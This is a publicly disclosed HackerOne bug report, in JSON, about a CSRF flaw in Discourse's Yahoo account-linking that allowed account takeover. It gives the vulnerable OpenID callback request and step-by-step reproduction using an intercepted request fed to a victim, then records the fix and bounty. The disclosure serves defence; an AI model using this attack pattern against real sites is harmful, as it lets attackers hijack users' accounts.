{"id":423022,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MjMwMjI=","url":"https://hackerone.com/reports/423022","title":"Account takeover at https://try.discourse.org due to no CSRF protection in connecting Yahoo account","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-10-12T16:57:57.640Z","submitted_at":"2018-10-12T16:57:57.640Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"avinash_","url":"/avinash_","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/R8UoKAt7JnXvNAYhaJxeGJHS/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16893,"url":"https://hackerone.com/discourse","handle":"discourse","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Discourse","twitter_handle":"discourse","website":"https://discourse.org","about":"Discourse is JavaScript (ember.js) and Ruby on Rails based 100% open source discussion software -- https://github.com/discourse/discourse"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-12-06T02:35:56.686Z","bug_reporter_agreed_on_going_public_at":"2018-11-06T02:35:42.023Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi\n\nThere is an option in https://try.discourse.org/u/testh1ay/preferences/account to connect our Yahoo account.\n\nI noticed Connect Yahoo account option have the workflow with GET method and  there is lack of csrf protection on connecting yahoo account which can help attacker into inducing victim to connect attacker's yahoo account to victim's discourse account, and it leads to full account takeover of victim's account.\n\nVulnerable Request:\n\nGET /auth/yahoo/callback?_method=post\u0026openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0\u0026openid.mode=id_res\u0026openid.return_to=https%3A%2F%2Ftry.discourse.org%2Fauth%2Fyahoo%2Fcallback%3F_method%3Dpost\u0026openid.claimed_id=https%3A%2F%2Fme.yahoo.com%2Fa%2F7qAAT.abcd\u0026openid.identity=https%3A%2F%2Fme.yahoo.com%2Fa%2F7qAAT.abcd\u0026openid.realm=https%3A%2F%2Ftry.discourse.org\u0026openid.ns.ax=http%3A%2F%2Fopenid.net%2Fsrv%2Fax%2F1.0\u0026openid.ax.mode=fetch_response\u0026openid.ax.value.email=testhackeroneay%40yahoo.com\u0026openid.ax.value.fullname=test%20hackerone\u0026openid.ax.value.nickname=test\u0026openid.assoc_handle=abcd\u0026openid.response_nonce=2018-10-12T16%3A27%defg-\u0026openid.signed=assoc_handle%2Cclaimed_id%2Cidentity%2Cmode%2Cns%2Cop_endpoint%2Cresponse_nonce%2Creturn_to%2Csigned%2Cax.value.email%2Cax.type.email%2Cax.value.fullname%2Cax.type.fullname%2Cax.value.nickname%2Cax.type.nickname%2Cns.ax%2Cax.mode%2Cpape.auth_level.nist\u0026openid.op_endpoint=https%3A%2F%2Fopen.login.yahooapis.com%2Fopenid%2Fop%2Fauth\u0026openid.ax.type.email=http%3A%2F%2Faxschema.org%2Fcontact%2Femail\u0026openid.ax.type.fullname=http%3A%2F%2Faxschema.org%2FnamePerson\u0026openid.ax.type.nickname=http%3A%2F%2Faxschema.org%2FnamePerson%2Ffriendly\u0026openid.pape.auth_level.nist=0\u0026openid.sig=9p%2Bxyz HTTP/1.1\nHost: try.discourse.org\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\n\nSteps to reproduce:\n\n1. Attacker go to https://try.discourse.org/u/user/preferences/account\n2. Switch on burp interceptor and click on Yahoo connect.\n3. Go to burp interceptor and after forwarding some requests attacker will find the upper mentioned vulnerable request.\n4. Copy that and drop the request( here you saved the auth token generated by yahoo).\n5. Now feed the copied request to authenticated victim (as a html form or as an url).\n6. Victim get the message authentication complete and get redirected to https://try.discourse.org/?authComplete=true.\n7. Attacker open his browser and try to login with yahoo.\n8. Attacker get redirected to https://try.discourse.org/auth/yahoo/null\n9. Attacker open https://try.discourse.org\n10. Check Victim's account successfully compromised.\n\n## Impact\n\nAccount Takeover.","bounty_amount":"512.0","formatted_bounty":"$512","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-12-06T02:35:42.078Z","allow_singular_disclosure_after":-89900587.53396484,"singular_disclosure_allowed":true,"vote_count":81,"voters":["muon4","sameerphad72","spam404","andi","mik317","dhakal_ananda","flashdisk","ali","ahiezer","waymobetta","and 71 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3543323,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Anybody to response?","automated_response":false,"created_at":"2018-10-27T13:21:13.595Z","updated_at":"2018-10-27T13:21:13.595Z","actor":{"username":"avinash_","cleared":false,"url":"/avinash_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/R8UoKAt7JnXvNAYhaJxeGJHS/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3561676,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @avinash_ , \n\nThanks for your submission. We are currently reviewing your report and will get back to you once we have additional information to share.\n\nKind regards,\n@ktistai","automated_response":false,"created_at":"2018-10-31T09:32:54.873Z","updated_at":"2018-10-31T09:32:54.873Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3561749,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @avinash_ \n\nThank you for your submission! We were able to validate your report, and we have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and if/when a fix will be implemented. Please note that the status and severity are subject to change.\n\nThanks, \n@ktistai","automated_response":false,"created_at":"2018-10-31T10:03:11.606Z","updated_at":"2018-10-31T10:03:11.606Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3580800,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ktistai \n\nIt seems fixed, On connecting yahoo account it is releasing csrf token(as state=token123). During reproducing the attack it behaving an error message as ```Sorry, there was an error authorizing your account. Perhaps you did not approve authorization?```.\n\nCan you please check this from your end !\n\nBest Regards","automated_response":false,"created_at":"2018-11-03T13:27:06.632Z","updated_at":"2018-11-03T13:27:06.632Z","actor":{"username":"avinash_","cleared":false,"url":"/avinash_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/R8UoKAt7JnXvNAYhaJxeGJHS/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3589807,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2018-11-05T21:09:23.848Z","updated_at":"2018-11-05T21:09:23.848Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"avinash_","url":"/avinash_"},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3589808,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-11-05T21:09:31.018Z","updated_at":"2018-11-05T21:09:31.018Z","actor":{"url":"/discourse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Discourse"}},"bounty_amount":"512.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"discourse","collaborator":{"username":"avinash_","url":"/avinash_"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3591089,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @discourse_team \n\nThanks for bounty :)\n\nBest Regards","automated_response":false,"created_at":"2018-11-06T02:32:57.775Z","updated_at":"2018-11-06T02:32:57.775Z","actor":{"username":"avinash_","cleared":false,"url":"/avinash_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/R8UoKAt7JnXvNAYhaJxeGJHS/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3591098,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Preety nice bug... Can we please disclose this?","automated_response":false,"created_at":"2018-11-06T02:35:42.043Z","updated_at":"2018-11-06T02:35:42.043Z","first_to_agree":true,"actor":{"username":"avinash_","cleared":false,"url":"/avinash_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/R8UoKAt7JnXvNAYhaJxeGJHS/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3772983,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-12-06T02:35:56.704Z","updated_at":"2018-12-06T02:35:56.704Z","actor":{"url":"/discourse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Discourse"}},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}